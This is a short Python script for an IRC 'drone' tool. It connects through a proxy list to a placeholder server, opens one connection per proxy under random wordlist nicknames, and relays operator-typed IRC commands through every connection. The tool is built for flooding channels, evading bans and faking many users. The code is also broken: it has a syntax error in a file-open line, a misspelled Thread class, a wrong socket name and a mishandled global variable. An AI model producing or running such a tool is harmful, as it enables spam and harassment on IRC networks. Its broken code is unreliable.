#!/usr/bin/python
import socket
import time
import random
import threading
import socks
import sys

global_command = ''
server = socket.gethostbyname('SERVER.COM')
port = 6667

with open('proxylist.txt','r'): as p:
	proxies = p.read().splitlines()
	
with open('wordlist.txt','r') as w: #generate a randomized limited pool of names
	wordlist = w.read().splitlines()
	random_index = random.randint(0,len(wordlist) - 500)
	small_list = wordlist[random_index:(random_index + 500)]

class userinput(threading.Tread): #Commands must be entered !COMMAND (example: !PRIVMSG #CHANNEL : TEST)
	def run(self):
		while True:
			try:
				command = raw_input('Enter Command: ')
				if command[0]:
					global_command = command
			except Exception as e:
				print 'Input Error: ' + e
				
class irc(threading.Thread): #creating drone
	def run(self):
		ircsock = socks.socksocket()
		try:
			split_proxy = proxy.split(":")
			ircsock.setproxy(socks.PROXY_TYPE_HTTP, split_proxy[0], int(split_proxy[1]))
			ircsock.connect((server, port))
			ircsock.send('USER %s gnu gnu :%s\r\n' % (random.choice(small_list),random.choice(small_list)))
			ircsock.send('NICK %s\r\n' % (random.choice(wordlist)))
			data = ircsock.recv(1024)
			if data[0:4] == 'PING':
				ircsock.send('PONG ' + data.split()[1] + '\r\n')
			time.sleep(2)
			
			while True:
				data = irc.recv(1024)
				if data[0:4] == 'PING':
					ircsock.send('PONG ' + data.split()[1] + '\r\n')
				
				if global_command[0] == '!':
					ircsock.send(global_command.strip()[1:] + '\r\n')
				
				time.sleep(1)
					
		except:
			ircsock.close()
			
userinput().start()
for proxy in proxies:
	irc().start()
	time.sleep(0.1)
